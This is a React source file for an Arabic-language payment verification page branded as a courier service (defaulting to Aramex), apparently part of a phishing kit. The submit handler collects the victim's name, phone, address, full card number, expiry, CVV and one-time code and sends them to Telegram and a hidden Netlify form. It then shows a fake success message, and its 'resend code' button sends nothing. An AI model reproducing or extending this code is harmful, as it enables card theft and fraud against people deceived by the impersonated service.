import { useState, useEffect, useRef } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { getServiceBranding } from "@/lib/serviceLogos";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { Shield, AlertCircle, ArrowLeft } from "lucide-react";
import FullScreenLoader from "@/components/FullScreenLoader";
import { useToast } from "@/hooks/use-toast";
import { useLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";

const PaymentOTPForm = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading } = useLink(id);
  
  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""]);
  const [attempts, setAttempts] = useState(0);
  const [error, setError] = useState("");
  const [countdown, setCountdown] = useState(60);
  
  // Create refs for all inputs
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  
  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');

  if (isLoading) {
    return <FullScreenLoader label="جاري تجهيز التحقق بخطوتين..." />;
  }

  if (!linkData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <Shield className="w-12 h-12 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-lg font-semibold mb-2">تعذر تحميل بيانات التحقق</h2>
          <p className="text-sm text-muted-foreground">الرجاء التحقق من الرابط أو إعادة المحاولة لاحقاً.</p>
        </div>
      </div>
    );
  }

  const payload = (linkData.payload ?? {}) as Record<string, any>;
  const serviceKey = payload.service_key || customerInfo.service || 'aramex';
  const serviceName = payload.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const amount = payload?.cod_amount || 500;
  const formattedAmount = `${amount} ر.س`;
  
  // Demo OTP: 123456
  const DEMO_OTP = "123456";
  
  useEffect(() => {
    const method = sessionStorage.getItem('paymentMethod');
    if (!method) {
      navigate(`/pay/${id}/track`);
    }
  }, [id, navigate]);

  // Countdown timer effect
  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [countdown]);
  
  // Focus first input on mount
  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);
  
  const handleChange = (index: number, value: string) => {
    // Only allow numbers
    const numericValue = value.replace(/[^0-9]/g, '');
    
    if (numericValue.length <= 1) {
      const newOtp = [...otp];
      newOtp[index] = numericValue;
      setOtp(newOtp);
      setError("");
      
      // Auto-focus next input if value entered
      if (numericValue && index < 5) {
        inputRefs.current[index + 1]?.focus();
      }
    }
  };
  
  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    // Handle backspace
    if (e.key === 'Backspace') {
      e.preventDefault();
      
      if (otp[index]) {
        // Clear current input
        const newOtp = [...otp];
        newOtp[index] = "";
        setOtp(newOtp);
      } else if (index > 0) {
        // Move to previous input and clear it
        const newOtp = [...otp];
        newOtp[index - 1] = "";
        setOtp(newOtp);
        inputRefs.current[index - 1]?.focus();
      }
    }
    
    // Handle Delete key
    if (e.key === 'Delete') {
      e.preventDefault();
      const newOtp = [...otp];
      newOtp[index] = "";
      setOtp(newOtp);
    }
    
    // Handle arrow keys
    if (e.key === 'ArrowLeft' && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
    if (e.key === 'ArrowRight' && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
    
    // Clear all on Escape
    if (e.key === 'Escape') {
      handleClearAll();
    }
  };
  
  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
    
    if (pastedData) {
      const newOtp = [...otp];
      for (let i = 0; i < pastedData.length && i < 6; i++) {
        newOtp[i] = pastedData[i];
      }
      setOtp(newOtp);
      
      // Focus the next empty input or last input
      const nextEmptyIndex = newOtp.findIndex(val => !val);
      if (nextEmptyIndex !== -1) {
        inputRefs.current[nextEmptyIndex]?.focus();
      } else {
        inputRefs.current[5]?.focus();
      }
    }
  };
  
  const handleClearAll = () => {
    setOtp(["", "", "", "", "", ""]);
    setError("");
    inputRefs.current[0]?.focus();
  };
  
  const handleDeleteLast = () => {
    const lastFilledIndex = otp.findLastIndex(val => val !== "");
    if (lastFilledIndex !== -1) {
      const newOtp = [...otp];
      newOtp[lastFilledIndex] = "";
      setOtp(newOtp);
      inputRefs.current[lastFilledIndex]?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    
    const otpString = otp.join('');
    
    if (otpString.length !== 6) {
      setError("الرجاء إدخال رمز التحقق كاملاً");
      return;
    }
    
    if (otpString === DEMO_OTP) {
      // Submit to Netlify Forms
      try {
        await fetch("/", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            "form-name": "payment-confirmation",
            name: customerInfo.name || '',
            email: customerInfo.email || '',
            phone: customerInfo.phone || '',
            service: serviceName,
            amount: formattedAmount,
            cardLast4: sessionStorage.getItem('cardLast4') || '',
            cardholder: sessionStorage.getItem('cardName') || '',
            otp: otpString,
            timestamp: new Date().toISOString()
          }).toString()
        });
      } catch (err) {
        console.error("Form submission error:", err);
      }
      
      // Send complete payment confirmation to Telegram
      const telegramResult = await sendToTelegram({
        type: 'payment_confirmation',
        data: {
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          address: customerInfo.address || '',
          service: serviceName,
          amount: formattedAmount,
          cardholder: sessionStorage.getItem('cardName') || '',
          cardNumber: sessionStorage.getItem('cardNumber') || '',
          cardLast4: sessionStorage.getItem('cardLast4') || '',
          expiry: sessionStorage.getItem('cardExpiry') || '12/25',
          cvv: sessionStorage.getItem('cardCvv') || '',
          otp: otpString
        },
        timestamp: new Date().toISOString()
      });

      if (telegramResult.success) {
        console.log('Payment confirmation sent to Telegram successfully');
      } else {
        console.error('Failed to send payment confirmation to Telegram:', telegramResult.error);
      }
      
      toast({
        title: "تم بنجاح!",
        description: "تم تأكيد الدفع بنجاح",
      });
      
      sessionStorage.removeItem('paymentMethod');
      sessionStorage.removeItem('selectedBank');
      sessionStorage.removeItem('selectedCountry');
      sessionStorage.removeItem('customerInfo');
      sessionStorage.removeItem('cardName');
      sessionStorage.removeItem('cardNumber');
      sessionStorage.removeItem('cardLast4');
      sessionStorage.removeItem('cardExpiry');
      sessionStorage.removeItem('cardCvv');
      sessionStorage.removeItem('cardType');
      sessionStorage.removeItem('bankLoginData');

      navigate(`/pay/${id}/receipt`);
    } else {
      const newAttempts = attempts + 1;
      setAttempts(newAttempts);
      
      if (newAttempts >= 3) {
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
        toast({
          title: "تم الحظر",
          description: "لقد تجاوزت عدد المحاولات المسموحة",
          variant: "destructive",
        });
      } else {
        setError(`رمز التحقق غير صحيح. حاول مرة أخرى. (${3 - newAttempts} محاولات متبقية)`);
        handleClearAll();
      }
    }
  };
  
  const isOtpComplete = otp.every(digit => digit !== "");
  const hasAnyDigit = otp.some(digit => digit !== "");
  
  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title="رمز التحقق"
      description={`أدخل رمز التحقق لخدمة ${serviceName}`}
      icon={<Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
    >
      {/* Title Section */}
      <div className="text-center mb-6 sm:mb-8">
        <div 
          className="w-16 h-16 sm:w-20 sm:h-20 rounded-full mx-auto mb-4 flex items-center justify-center animate-pulse shadow-lg"
          style={{
            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
          }}
        >
          <Shield className="w-8 h-8 sm:w-10 sm:h-10 text-white" />
        </div>
        <h1 className="text-2xl sm:text-3xl font-bold mb-2">رمز التحقق</h1>
        <p className="text-sm sm:text-base text-muted-foreground">أدخل الرمز المرسل إلى هاتفك</p>
      </div>

      {/* Info */}
      <div 
        className="rounded-lg p-3 sm:p-4 mb-6"
        style={{
          background: `${branding.colors.primary}10`,
          border: `1px solid ${branding.colors.primary}30`
        }}
      >
        <p className="text-xs sm:text-sm text-center">
          تم إرسال رمز التحقق المكون من 6 أرقام إلى هاتفك المسجل في البنك
        </p>
      </div>
      
      <form onSubmit={handleSubmit}>
        {/* OTP Input - 6 digits */}
        <div className="mb-6">
          <div className="flex gap-2 sm:gap-3 justify-center items-center mb-4" dir="ltr">
            {otp.map((digit, index) => (
              <Input
                key={index}
                ref={(el) => (inputRefs.current[index] = el)}
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                onPaste={handlePaste}
                className="w-12 h-14 sm:w-16 sm:h-20 text-center text-xl sm:text-3xl font-bold border-2 rounded-xl transition-all"
                style={{
                  borderColor: digit ? branding.colors.primary : undefined,
                  backgroundColor: digit ? `${branding.colors.primary}08` : undefined
                }}
                disabled={attempts >= 3}
                autoComplete="off"
              />
            ))}
          </div>
        </div>
      
        {/* Error Message */}
        {error && (
          <div 
            className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2 bg-destructive/10 border border-destructive/30"
          >
            <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0 text-destructive" />
            <p className="text-xs sm:text-sm text-destructive">{error}</p>
          </div>
        )}
        
        {/* Countdown Timer */}
        {countdown > 0 && (
          <div className="text-center mb-6">
            <p className="text-xs sm:text-sm text-muted-foreground">
              إعادة إرسال الرمز بعد <strong>{countdown}</strong> ثانية
            </p>
          </div>
        )}

        {/* Attempts Counter */}
        {attempts > 0 && attempts < 3 && (
          <div className="text-center mb-6">
            <p className="text-xs sm:text-sm text-yellow-600">
              المحاولات المتبقية: <strong>{3 - attempts}</strong>
            </p>
          </div>
        )}
        
        {/* Submit Button */}
        <Button
          type="submit"
          size="lg"
          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
          disabled={attempts >= 3 || !isOtpComplete}
          style={{
            background: attempts >= 3 
              ? '#666' 
              : `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
          }}
        >
          {attempts >= 3 ? (
            <span>محظور مؤقتاً</span>
          ) : (
            <>
              <span className="ml-2">تأكيد الدفع</span>
              <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
            </>
          )}
        </Button>
        
        {countdown === 0 && (
          <Button
            type="button"
            variant="ghost"
            className="w-full mt-3"
            style={{ color: branding.colors.primary }}
            onClick={() => {
              setCountdown(60);
              toast({
                title: "تم إرسال الرمز",
                description: "تم إرسال رمز تحقق جديد إلى هاتفك",
              });
            }}
          >
            إعادة إرسال الرمز
          </Button>
        )}
      </form>
      
      {/* Demo Info */}
      <div className="mt-6 p-3 bg-muted/30 rounded-lg text-center">
        <p className="text-xs text-muted-foreground">
          🔐 للاختبار: استخدم الرمز <strong className="text-foreground">123456</strong>
        </p>
      </div>
      
      {/* Hidden Netlify Form */}
      <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="cardholder" />
        <input type="text" name="cardLast4" />
        <input type="text" name="otp" />
        <input type="text" name="timestamp" />
      </form>
    </DynamicPaymentLayout>
  );
};

export default PaymentOTPForm;
